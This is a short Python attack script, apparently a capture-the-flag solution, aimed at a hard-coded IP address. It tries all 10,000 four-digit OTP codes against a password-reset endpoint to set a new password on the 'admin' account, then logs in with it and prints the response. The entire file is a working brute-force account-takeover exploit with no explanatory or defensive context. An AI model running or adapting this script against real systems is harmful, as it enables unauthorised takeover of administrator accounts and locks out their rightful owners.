#!/usr/bin/env python3

import itertools
from uuid import uuid4

import requests
from tqdm import tqdm

url = "http://103.185.44.122:7313"

password = str(uuid4())
data = {
    "username": "admin",
    "newpassword": password,
}

otps = itertools.product(range(10), repeat=4)

for otp in tqdm(otps):
    data["otp"] = ''.join(map(str, otp))
    r = requests.post(f"{url}/reset", data=data)
    if "Invalid OTP" not in r.text:
        break


print(f"[+] Found OTP: {data['otp']}")

data = {
    "username": "admin",
    "password": password,
}
r = requests.post(url, data=data)
print(r.text)
